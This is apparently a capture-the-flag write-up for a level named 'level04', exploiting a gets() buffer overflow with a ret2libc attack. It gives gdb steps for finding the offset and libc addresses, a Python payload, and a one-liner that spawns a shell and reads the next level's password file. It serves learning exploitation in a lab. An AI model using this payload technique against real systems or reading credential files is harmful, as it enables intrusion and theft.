Level04 - ret2libc Attack Vulnerability

char buffer[128];
gets(buffer);  // No bounds checking!

ret2libc Technique

Solution

Step 1: Find offset
bashgdb ./level04
(gdb) set follow-fork-mode child
(gdb) r
# Input cyclic pattern
# Crash at 0x41326641
# Offset = 156

https://wiremask.eu/tools/buffer-overflow-pattern-generator/

Step 2: Find libc addresses
bash(gdb) info function system
0xf7e6aed0  system

(gdb) info function exit
0xf7e5eb70  exit

(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec

Step 3: Build ret2libc payload

pythonpadding = "A" * 156
system_addr = "\xd0\xae\xe6\xf7"  # system()
exit_addr = "\x70\xeb\xe5\xf7"    # exit() 
binsh_addr = "\xec\x97\xf8\xf7"   # "/bin/sh"

# Stack: [padding][system][exit][/bin/sh]

Step 4: Execute
bash (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level04
cat /home/users/level05/.pass

